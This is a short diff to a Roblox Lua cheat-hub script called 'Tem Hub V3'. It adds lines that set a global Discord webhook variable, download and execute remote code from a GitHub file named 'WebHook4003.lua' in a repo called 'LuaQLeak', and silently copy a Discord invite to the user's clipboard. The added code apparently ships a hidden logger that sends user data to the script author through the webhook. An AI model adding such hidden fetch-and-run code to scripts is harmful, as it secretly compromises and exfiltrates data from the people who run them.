@@ -82,7 +82,13 @@ local gameids = {
     
     for i, mainid in pairs(gameids) do
     if mainid == placeid then
+
+        getgenv().WebhookHere = DiscordWebhook
+ 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+
     local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/T3mm1epurple/rayfieldedit/main/script'))()
+    setclipboard("https://discord.gg/n7fFChP5x5")
         
     local Window = Rayfield:CreateWindow({
        Name = "Tem Hub V3 (1.0)",
